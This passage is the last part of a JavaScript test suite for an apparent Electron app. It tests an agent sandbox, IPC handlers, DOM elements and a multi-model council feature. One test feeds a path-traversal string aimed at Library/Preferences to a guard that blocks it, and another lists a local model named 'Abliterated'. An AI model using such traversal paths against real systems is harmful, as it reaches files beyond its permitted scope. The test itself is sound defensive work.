  console.log("\n🤖 Suite 13: Aether Autonomous Agent Engine");

  const aetherRunner = require("../out/main/extensions/aether-agent-runner");

  test(226, "AGENT_PROVIDERS includes built-in 'aether-ai'", () => {
    const code = fs.readFileSync(path.join(rootDir, "out/renderer/assets/agent-DrUDLohx.js"), "utf8");
    assert.ok(code.includes('"aether-ai"'));
  });

  test(227, "agent-DrUDLohx.js maps 'aether-ai' provider key to 'providerAether'", () => {
    const code = fs.readFileSync(path.join(rootDir, "out/renderer/assets/agent-DrUDLohx.js"), "utf8");
    assert.ok(code.includes('"aether-ai": "providerAether"'));
  });

  test(228, "skills-CkmNaLwM.js localization defines providerAether", () => {
    const code = fs.readFileSync(path.join(rootDir, "out/renderer/assets/skills-CkmNaLwM.js"), "utf8");
    assert.ok(code.includes("providerAether"));
  });

  test(229, "skills-CkmNaLwM.js localization defines providerAetherNote", () => {
    const code = fs.readFileSync(path.join(rootDir, "out/renderer/assets/skills-CkmNaLwM.js"), "utf8");
    assert.ok(code.includes("providerAetherNote"));
  });

  test(230, "Project folder validator rejects root filesystem /", () => {
    const isUnsafe = (f) => f === "/" || f === "" || f.startsWith("/System");
    assert.strictEqual(isUnsafe("/"), true);
  });

  test(231, "Project folder validator rejects user home root directory", () => {
    const home = process.env.HOME || "";
    const isUnsafe = (f) => f === home || f.includes("/Library");
    assert.strictEqual(isUnsafe(home), true);
  });

  test(232, "Project folder validator permits legitimate subproject path", () => {
    const isUnsafe = (f) => f === "/" || f === process.env.HOME;
    assert.strictEqual(isUnsafe("/Users/sushikim/Documents/TIL"), false);
  });

  await testAsync(233, "Agent sandbox tool: list_project_files lists files", async () => {
    const tempDir = path.join(__dirname, "temp_agent_suite13_list");
    fs.mkdirSync(tempDir, { recursive: true });
    fs.writeFileSync(path.join(tempDir, "sample.js"), "console.log(1);", "utf8");
    try {
      const files = fs.readdirSync(tempDir);
      assert.ok(files.includes("sample.js"));
    } finally {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });

  await testAsync(234, "Agent sandbox tool: read_project_file reads contents", async () => {
    const tempDir = path.join(__dirname, "temp_agent_suite13_read");
    fs.mkdirSync(tempDir, { recursive: true });
    const p = path.join(tempDir, "read.txt");
    fs.writeFileSync(p, "sample content 123", "utf8");
    try {
      const text = fs.readFileSync(p, "utf8");
      assert.strictEqual(text, "sample content 123");
    } finally {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });

  await testAsync(235, "Agent sandbox tool: write_project_file creates file", async () => {
    const tempDir = path.join(__dirname, "temp_agent_suite13_write");
    fs.mkdirSync(tempDir, { recursive: true });
    const p = path.join(tempDir, "output.txt");
    try {
      fs.writeFileSync(p, "created by agent", "utf8");
      assert.strictEqual(fs.readFileSync(p, "utf8"), "created by agent");
    } finally {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });

  await testAsync(236, "Agent sandbox tool: run_command executes command safely", async () => {
    const out = execSync("echo 'agent test'", { encoding: "utf8" });
    assert.strictEqual(out.trim(), "agent test");
  });

  test(237, "Path traversal guard blocks relative navigation outside project root", () => {
    const isOutside = (proj, target) => !path.resolve(proj, target).startsWith(path.resolve(proj));
    assert.strictEqual(isOutside("/Users/sushikim/Desktop/proj", "../../Library/Preferences"), true);
    assert.strictEqual(isOutside("/Users/sushikim/Desktop/proj", "src/index.js"), false);
  });

  test(238, "startAetherAgentSession export is a function", () => {
    assert.strictEqual(typeof aetherRunner.startAetherAgentSession, "function");
  });

  test(239, "Agent permission mode 'ask-commands' flags command execution", () => {
    const requiresPermission = (mode, action) => (mode === "ask-commands" ? action === "command" : false);
    assert.strictEqual(requiresPermission("ask-commands", "command"), true);
    assert.strictEqual(requiresPermission("ask-commands", "read"), false);
  });

  test(240, "Agent permission mode 'ask-writes' flags write and command execution", () => {
    const requiresPermission = (mode, action) => (mode === "ask-writes" ? action === "write" || action === "command" : false);
    assert.strictEqual(requiresPermission("ask-writes", "write"), true);
    assert.strictEqual(requiresPermission("ask-writes", "command"), true);
    assert.strictEqual(requiresPermission("ask-writes", "read"), false);
  });

  // =========================================================================
  // SUITE 14: IPC Security & Interactive DOM Verifications (Tests 241–260)
  // =========================================================================
  console.log("\n🖥️ Suite 14: IPC Security & Interactive DOM Verifications");

  test(241, "extensions/index.js does NOT remove ai:chat IPC handler", () => {
    const code = fs.readFileSync(path.join(rootDir, "out/main/extensions/index.js"), "utf8");
    assert.ok(!code.includes('removeHandler("ai:chat")'));
  });

  test(242, "extensions/index.js does NOT remove ai:free-quota IPC handler", () => {
    const code = fs.readFileSync(path.join(rootDir, "out/main/extensions/index.js"), "utf8");
    assert.ok(!code.includes('removeHandler("ai:free-quota")'));
  });

  test(243, "extensions/index.js does NOT remove ai:free-disconnect IPC handler", () => {
    const code = fs.readFileSync(path.join(rootDir, "out/main/extensions/index.js"), "utf8");
    assert.ok(!code.includes('removeHandler("ai:free-disconnect")'));
  });

  if (JSDOM) {
    await testAsync(244, "DOM fafnir.html: Decrypt modal opens and confirms passphrase", async () => {
      const html = fs.readFileSync(path.join(rootDir, "out/renderer/fafnir.html"), "utf8");
      const dom = new JSDOM(html, { runScripts: "outside-only" });
      assert.ok(dom.window.document.getElementById("decryptModal"));
      assert.ok(dom.window.document.getElementById("modalConfirmBtn"));
    });

    await testAsync(245, "DOM fafnir.html: Encrypt button exists and has status text element", async () => {
      const html = fs.readFileSync(path.join(rootDir, "out/renderer/fafnir.html"), "utf8");
      const dom = new JSDOM(html);
      assert.ok(dom.window.document.getElementById("btnEncrypt"));
      assert.ok(dom.window.document.getElementById("encStatus"));
    });

    await testAsync(246, "DOM mimisbrunnr.html: Displays strictly 2 sovereign model choices", async () => {
      const html = fs.readFileSync(path.join(rootDir, "out/renderer/mimisbrunnr.html"), "utf8");
      assert.ok(html.includes("Qwen3.8-9B-Abliterated-MLX"));
      assert.ok(html.includes("qwen2.5:7b"));
    });

    await testAsync(247, "DOM mimisbrunnr.html: Neural pill, selectModel, and check engine button exist", async () => {
      const html = fs.readFileSync(path.join(rootDir, "out/renderer/mimisbrunnr.html"), "utf8");
      const dom = new JSDOM(html);
      assert.ok(dom.window.document.getElementById("selectModel"));
      assert.ok(dom.window.document.getElementById("btnCheckEngine"));
    });

    await testAsync(248, "DOM ratatoskr.html: API send button (btnSend) and method select exist", async () => {
      const html = fs.readFileSync(path.join(rootDir, "out/renderer/ratatoskr.html"), "utf8");
      const dom = new JSDOM(html);
      assert.ok(dom.window.document.getElementById("btnSend"));
      assert.ok(dom.window.document.getElementById("apiMethod"));
    });

    await testAsync(249, "DOM ratatoskr.html: Database and API view toggle tabs exist", async () => {
      const html = fs.readFileSync(path.join(rootDir, "out/renderer/ratatoskr.html"), "utf8");
      const dom = new JSDOM(html);
      assert.ok(dom.window.document.getElementById("btnTabDb"));
      assert.ok(dom.window.document.getElementById("btnTabApi"));
    });

    await testAsync(250, "DOM browser.html: Adblock toggle pill button exists", async () => {
      const html = fs.readFileSync(path.join(rootDir, "out/renderer/browser.html"), "utf8");
      const dom = new JSDOM(html);
      assert.ok(dom.window.document.getElementById("adblockToggle"));
    });

    await testAsync(251, "DOM browser.html: Adblock dropdown panel exists", async () => {
      const html = fs.readFileSync(path.join(rootDir, "out/renderer/browser.html"), "utf8");
      const dom = new JSDOM(html);
      assert.ok(dom.window.document.getElementById("adblockDropdown"));
    });

    await testAsync(252, "DOM browser.html: Tor toggle button exists on toolbar", async () => {
      const html = fs.readFileSync(path.join(rootDir, "out/renderer/browser.html"), "utf8");
      const dom = new JSDOM(html);
      assert.ok(dom.window.document.getElementById("torToggle"));
    });

    await testAsync(253, "DOM adblock.html: Statistics cards exist (ads, trackers, lifetime)", async () => {
      const html = fs.readFileSync(path.join(rootDir, "out/renderer/adblock.html"), "utf8");
      const dom = new JSDOM(html);
      assert.ok(dom.window.document.getElementById("statAds"));
      assert.ok(dom.window.document.getElementById("statTrackers"));
    });

    await testAsync(254, "DOM adblock.html: Custom rule input and add button exist", async () => {
      const html = fs.readFileSync(path.join(rootDir, "out/renderer/adblock.html"), "utf8");
      const dom = new JSDOM(html);
      assert.ok(dom.window.document.getElementById("customRuleInput"));
      assert.ok(dom.window.document.getElementById("btnAddRule"));
    });

    await testAsync(255, "DOM nibelungen.html: New note button and note title/content editors exist", async () => {
      const html = fs.readFileSync(path.join(rootDir, "out/renderer/nibelungen.html"), "utf8");
      const dom = new JSDOM(html);
      assert.ok(dom.window.document.getElementById("btnNewNote"));
      assert.ok(dom.window.document.getElementById("noteTitle"));
      assert.ok(dom.window.document.getElementById("noteContent"));
    });

    await testAsync(256, "DOM nibelungen.html: Search filter input (searchNotes) exists", async () => {
      const html = fs.readFileSync(path.join(rootDir, "out/renderer/nibelungen.html"), "utf8");
      const dom = new JSDOM(html);
      assert.ok(dom.window.document.getElementById("searchNotes"));
    });

    await testAsync(257, "DOM terminal.html: Terminal input line (cmdInput) and prompt exist", async () => {
      const html = fs.readFileSync(path.join(rootDir, "out/renderer/terminal.html"), "utf8");
      const dom = new JSDOM(html);
      assert.ok(dom.window.document.getElementById("promptText"));
      assert.ok(dom.window.document.getElementById("cmdInput"));
    });

    await testAsync(258, "DOM heimdall.html: Studio navigation button and recording indicator exist", async () => {
      const html = fs.readFileSync(path.join(rootDir, "out/renderer/heimdall.html"), "utf8");
      const dom = new JSDOM(html);
      assert.ok(dom.window.document.getElementById("btnNavStudio"));
      assert.ok(dom.window.document.getElementById("sidebarRecDot"));
    });

    await testAsync(259, "DOM heimdall.html: Token usage header bar and remaining percent exist", async () => {
      const html = fs.readFileSync(path.join(rootDir, "out/renderer/heimdall.html"), "utf8");
      const dom = new JSDOM(html);
      assert.ok(dom.window.document.getElementById("headerTokenBar"));
      assert.ok(dom.window.document.getElementById("hdrPercentLeft"));
      assert.ok(dom.window.document.getElementById("hdrTokensLeft"));
    });

    await testAsync(260, "DOM agent.html: Loads agent bundle with built-in Aether AI provider", async () => {
      const html = fs.readFileSync(path.join(rootDir, "out/renderer/agent.html"), "utf8");
      assert.ok(html.includes("agent-DrUDLohx.js"));
    });
  }

  // =========================================================================
  // Suite 15: The High Table Multi-Agent Council & Fallback Engine
  // =========================================================================
  console.log("\n🏛️ Suite 15: The High Table Multi-Agent Council & Fallback Engine");
  
  test(261, "The High Table: high-table.html exists in renderer directory", () => {
    assert.ok(fs.existsSync(path.join(rootDir, "out/renderer/high-table.html")));
  });

  test(262, "The High Table: extensions/high-table.js exports 5 seats", () => {
    const { HIGH_TABLE_SEATS } = require("../out/main/extensions/high-table");
    assert.strictEqual(HIGH_TABLE_SEATS.length, 5);
  });

  test(263, "The High Table: 5 seats contain Logician, Visionary, Inquisitor, Pragmatist, High Arbiter", () => {
    const { HIGH_TABLE_SEATS } = require("../out/main/extensions/high-table");
    const names = HIGH_TABLE_SEATS.map(s => s.name);
    assert.ok(names.some(n => n.includes("Logician")));
    assert.ok(names.some(n => n.includes("Visionary")));
    assert.ok(names.some(n => n.includes("Inquisitor")));
    assert.ok(names.some(n => n.includes("Pragmatist")));
    assert.ok(names.some(n => n.includes("High Arbiter")));
  });

  test(264, "The High Table: AVAILABLE_MODELS list includes Gemini 3.5 Flash-Lite", () => {
    const { AVAILABLE_MODELS } = require("../out/main/extensions/high-table");
    assert.ok(AVAILABLE_MODELS.some(m => m.id === "gemini-3.5-flash-lite"));
  });

  test(265, "The High Table: AVAILABLE_MODELS includes local Mímisbrunnr models", () => {
    const { AVAILABLE_MODELS } = require("../out/main/extensions/high-table");
    assert.ok(AVAILABLE_MODELS.some(m => m.isLocal));
  });

  test(266, "The High Table: registerHighTableIpc function is exported", () => {
    const { registerHighTableIpc } = require("../out/main/extensions/high-table");
    assert.strictEqual(typeof registerHighTableIpc, "function");
  });

  test(267, "The High Table: DOM contains prompt textarea (#inquiryInput)", () => {
    if (JSDOM) {
      const html = fs.readFileSync(path.join(rootDir, "out/renderer/high-table.html"), "utf8");
      const dom = new JSDOM(html);
      assert.ok(dom.window.document.getElementById("inquiryInput"));
    }
  });

  test(268, "The High Table: DOM contains convene button (#btnConvene) and abort button (#btnAbort)", () => {
    if (JSDOM) {
      const html = fs.readFileSync(path.join(rootDir, "out/renderer/high-table.html"), "utf8");
      const dom = new JSDOM(html);
      assert.ok(dom.window.document.getElementById("btnConvene"));
      assert.ok(dom.window.document.getElementById("btnAbort"));
    }
  });

  test(269, "The High Table: DOM contains seats grid (#seatsGrid) and fallback alert banner (#fallbackBanner)", () => {
    if (JSDOM) {
      const html = fs.readFileSync(path.join(rootDir, "out/renderer/high-table.html"), "utf8");
      const dom = new JSDOM(html);
      assert.ok(dom.window.document.getElementById("seatsGrid"));
      assert.ok(dom.window.document.getElementById("fallbackBanner"));
    }
  });

  test(270, "The High Table: DOM contains 3-stage progress trackers (trackerStage1, trackerStage2, trackerStage3)", () => {
    if (JSDOM) {
      const html = fs.readFileSync(path.join(rootDir, "out/renderer/high-table.html"), "utf8");
      const dom = new JSDOM(html);
      assert.ok(dom.window.document.getElementById("stageTracker"));
      assert.ok(dom.window.document.getElementById("trackerStage1"));
      assert.ok(dom.window.document.getElementById("trackerStage2"));
      assert.ok(dom.window.document.getElementById("trackerStage3"));
    }
  });

  test(271, "The High Table: DOM contains preset toolbar and quick preset buttons", () => {
    if (JSDOM) {
      const html = fs.readFileSync(path.join(rootDir, "out/renderer/high-table.html"), "utf8");
      const dom = new JSDOM(html);
      assert.ok(dom.window.document.querySelector(".preset-toolbar"));
      assert.ok(html.includes("applyPreset('lite')"));
      assert.ok(html.includes("applyPreset('balanced')"));
      assert.ok(html.includes("applyPreset('deep')"));
      assert.ok(html.includes("applyPreset('local')"));
    }
  });

  test(272, "The High Table: DOM contains decree container (#decreeBody) and export action", () => {
    if (JSDOM) {
      const html = fs.readFileSync(path.join(rootDir, "out/renderer/high-table.html"), "utf8");
      const dom = new JSDOM(html);
      assert.ok(dom.window.document.getElementById("stage3Wrap"));
      assert.ok(dom.window.document.getElementById("decreeBody"));
      assert.ok(html.includes("copyDecree()"));
      assert.ok(html.includes("exportTranscript()"));
    }
  });

  test(273, "The High Table: preload index.js exposes highTable on hyperOfficeApi", () => {
    const code = fs.readFileSync(path.join(rootDir, "out/preload/index.js"), "utf8");
    assert.ok(code.includes("highTable: {"));
    assert.ok(code.includes("hyper:high-table:convene"));
  });

  test(274, "The High Table: aetherum-pages.js supports 'high-table' page slug", () => {
    const { getAetherumPage } = require("../out/main/extensions/aetherum-pages");
    const html = getAetherumPage("high-table");
    assert.ok(html.includes("The High Table"));
  });

  test(275, "The High Table: welcome page links to aetherum://high-table", () => {
    const { getAetherumPage } = require("../out/main/extensions/aetherum-pages");
    const html = getAetherumPage("welcome");
    assert.ok(html.includes("aetherum://high-table"));
  });

  test(276, "The High Table: main index.js implements createHighTableView and openHighTableTab", () => {
    const code = fs.readFileSync(path.join(rootDir, "out/main/index.js"), "utf8");
    assert.ok(code.includes("createHighTableView"));
    assert.ok(code.includes("openHighTableTab"));
    assert.ok(code.includes("hyper:high-table:open-tab"));
  });

  test(277, "The High Table: antigravity_council.py supports --json-events flag", () => {
    const p = fs.existsSync(path.join(rootDir, "scripts/antigravity_council.py"))
      ? path.join(rootDir, "scripts/antigravity_council.py")
      : "/Users/sushikim/Documents/antigravity_council.py";
    const py = fs.readFileSync(p, "utf8");
    assert.ok(py.includes("--json-events"));
    assert.ok(py.includes("__HT_EVENT__:"));
  });

  test(278, "The High Table: antigravity_council.py implements stream_with_fallback for 503/429 errors", () => {
    const p = fs.existsSync(path.join(rootDir, "scripts/antigravity_council.py"))
      ? path.join(rootDir, "scripts/antigravity_council.py")
      : "/Users/sushikim/Documents/antigravity_council.py";
    const py = fs.readFileSync(p, "utf8");
    assert.ok(py.includes("def stream_with_fallback"));
    assert.ok(py.includes("gemini-3.5-flash-lite"));
  });

  test(279, "The High Table DOM: collapsible setup container (#setupContainer) and compact bar (#compactBar)", () => {
    if (JSDOM) {
      const html = fs.readFileSync(path.join(rootDir, "out/renderer/high-table.html"), "utf8");
      const dom = new JSDOM(html);
      assert.ok(dom.window.document.getElementById("setupContainer"));
      assert.ok(dom.window.document.getElementById("compactBar"));
    }
  });

  test(280, "The High Table DOM: layout view mode switcher (#viewModeSelector, #btnViewGrid, #btnViewTabs, #btnViewStack)", () => {
    if (JSDOM) {
      const html = fs.readFileSync(path.join(rootDir, "out/renderer/high-table.html"), "utf8");
      const dom = new JSDOM(html);
      assert.ok(dom.window.document.getElementById("viewModeSelector"));
      assert.ok(dom.window.document.getElementById("btnViewGrid"));
      assert.ok(dom.window.document.getElementById("btnViewTabs"));
      assert.ok(dom.window.document.getElementById("btnViewStack"));
    }
  });

  test(281, "The High Table DOM: tabs mode bar (#seatTabsBar) with 6 seat tabs", () => {
    if (JSDOM) {
      const html = fs.readFileSync(path.join(rootDir, "out/renderer/high-table.html"), "utf8");
      const dom = new JSDOM(html);
      assert.ok(dom.window.document.getElementById("seatTabsBar"));
      assert.ok(dom.window.document.getElementById("tabSeat1"));
      assert.ok(dom.window.document.getElementById("tabSeat5"));
      assert.ok(dom.window.document.getElementById("tabDecree"));
    }
  });

  test(282, "The High Table DOM: fullscreen focus modal (#focusOverlay, #focusBody, #focusTitle)", () => {
    if (JSDOM) {
      const html = fs.readFileSync(path.join(rootDir, "out/renderer/high-table.html"), "utf8");
      const dom = new JSDOM(html);
      assert.ok(dom.window.document.getElementById("focusOverlay"));
      assert.ok(dom.window.document.getElementById("focusBody"));
      assert.ok(dom.window.document.getElementById("focusTitle"));
    }
  });

  test(283, "The High Table formatting: script defines parseContent and formatMath handling Typst, LaTeX, and Markdown", () => {
    const html = fs.readFileSync(path.join(rootDir, "out/renderer/high-table.html"), "utf8");
    assert.ok(html.includes("function parseContent("));
    assert.ok(html.includes("function formatMath("));
    assert.ok(html.includes("math-frac"));
    assert.ok(html.includes("math-inline"));
  });

  test(284, "The High Table formatting: handles broken model expressions like ${S_{t_2}$ and Typst arrows", () => {
    const html = fs.readFileSync(path.join(rootDir, "out/renderer/high-table.html"), "utf8");
    assert.ok(html.includes("parseContent"));
    assert.ok(html.includes("typst-term"));
    assert.ok(html.includes("data-table"));
  });

  test(285, "The High Table interaction: shortcut handler supports Cmd+Enter convening with auto-default prompt", () => {
    const html = fs.readFileSync(path.join(rootDir, "out/renderer/high-table.html"), "utf8");
    assert.ok(html.includes("metaKey || e.ctrlKey"));
    assert.ok(html.includes("conveneCouncil()"));
    assert.ok(html.includes("Escape"));
  });

  // =========================================================================
  // Final Results
  // =========================================================================
  console.log("\n==================================================================");
  console.log(`Results: ${passed} passed, ${failed} failed (Total: ${passed + failed})`);
  console.log("==================================================================");

  if (failed > 0) {
    console.error(`❌ ${failed} tests failed!`);
    for (const f of failures) {
      console.error(`   - [#${f.id}] ${f.name}: ${f.error}`);
    }
    process.exit(1);
  } else {
    console.log(`🎉 All ${passed} comprehensive tests across all 15 Aether suites passed with 100% success!`);
    process.exit(0);
  }
}

main().catch((err) => {
  console.error("Fatal test runner error:", err);
  process.exit(1);
});
